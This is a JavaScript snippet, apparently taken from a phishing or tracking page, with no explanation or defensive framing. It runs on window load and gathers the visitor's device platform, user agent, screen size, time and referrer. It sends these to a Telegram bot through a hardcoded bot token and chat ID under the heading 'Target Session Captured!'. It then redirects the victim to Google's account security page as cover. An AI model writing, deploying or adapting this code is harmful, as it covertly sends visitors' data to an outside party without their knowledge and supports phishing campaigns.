async function captureSession() {
    const token = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k'; 
    const chatId = '8639892987'; 
    
    const details = `
🔥 Target Session Captured!
📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}
⏰ Time: ${new Date().toLocaleString()}
🖥️ Screen: ${window.screen.width}x${window.screen.height}
🔗 Ref: ${document.referrer}
    `;

    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(details)}`;

    try {
        await fetch(telegramUrl);
    } catch (e) {
        console.error("Transmission failed");
    }

    setTimeout(() => {
        window.location.href = "https://myaccount.google.com/security";
    }, 1500);
}

window.onload = captureSession;
